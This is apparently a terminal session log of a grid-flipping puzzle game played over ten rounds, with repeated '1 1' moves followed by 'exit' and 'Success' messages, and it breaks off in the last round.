:)<br><br>Have fun ~<br><br><br>Round <span class="hljs-number">1</span>/<span class="hljs-number">10</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">2</span>/<span class="hljs-number">10</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">3</span>/<span class="hljs-number">10</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">4</span>/<span class="hljs-number">10</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">9</span> step(s).<br>&gt; <br>Round <span class="hljs-number">5</span>/<span class="hljs-number">10</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">6</span>/<span class="hljs-number">10</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">7</span>/<span class="hljs-number">10</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">8</span>/<span class="hljs-number">10</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">9</span>/<span class="hljs-number">10</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">10</span>/<span class="hljs-number">10</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span 